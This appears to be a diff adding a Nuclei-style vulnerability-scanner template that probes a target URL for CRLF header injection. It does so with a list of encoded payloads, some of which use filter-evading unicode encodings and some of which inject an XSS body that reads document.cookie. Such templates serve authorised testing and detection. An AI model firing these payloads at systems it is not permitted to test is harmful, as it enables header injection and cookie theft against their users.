@@ -1,0 +1,40 @@
+id: crlf-injection-header
+
+info:
+  name: Custom CRLF Injection Header
+  author: reewardius
+  severity: medium
+  reference:
+    - https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
+    - https://medium.com/@a7med.ctf/crlf-to-xss-8059ceefd349
+    - https://secinthemid.com/vulnerabilities/crlf-injection-attack/
+    - https://infosecwriteups.com/6000-with-microsoft-hall-of-fame-microsoft-firewall-bypass-crlf-to-xss-microsoft-bug-bounty-8f6615c47922
+  tags: crlf
+    
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%0aContent-Type:%0aX-Content-Type-Options:%20undefined%0a%0a<html>"
+      - "{{BaseURL}}/%EA%A8%8AContent-Type:%0aX-Content-Type-Options:%20undefined%0a%0a<html>"
+      - "{{BaseURL}}/%C0%8D%C0%8AContent-Type:%0aX-Content-Type-Options:%20undefined%0a%0a<html>"
+      - "{{BaseURL}}/%C4%8AContent-Type:%0aX-Content-Type-Options:%20undefined%0a%0a<html>"
+      - "{{BaseURL}}/%C4%8D%C4%8AContent-Type:%C4%8D%C4%8AX-Content-Type-Options:%20undefined%C4%8D%C4%8A<html>"
+      - "{{BaseURL}}/%0aContent-Type:%0aX-Content-Type-Options:%20undefined%0aX-XSS-Protection:0%0acontent-length:50%0a%0a%0a%3Chtml%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E"
+      - "{{BaseURL}}/%0d%0aContent-Type:%0aX-Content-Type-Options:%20undefined%0aX-XSS-Protection:0%0acontent-length:50%0a%0a%0a%3Chtml%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E"
+      - "{{BaseURL}}/%0aContent-Type:%20text/html%0aX-Content-Type-Options:%20undefined%0aX-XSS-Protection:0%0acontent-length:50%0a%0a%0a%3Chtml%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E"
+      - "{{BaseURL}}/%0d%0aContent-Type:%20text/html%0aX-Content-Type-Options:%20undefined%0aX-XSS-Protection:0%0acontent-length:50%0a%0a%0a%3Chtml%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E"
+      - "{{BaseURL}}/%0d%0aContent-Type:%0d%0aX-Content-Type-Options:%20undefined%0d%0a%0d%0a<html>"
+      - "{{BaseURL}}/%0d%0aContent-Type:%20text/html%0d%0aX-Content-Type-Options:%20undefined%0d%0aX-XSS-Protection:0%0d%0acontent-length:50%0d%0a%0d%0a%0a%3Chtml%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E"
+      
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "X-Content-Type-Options: undefined"
+          
+      - type: word
+        part: body
+        words:
+          - "<html>"
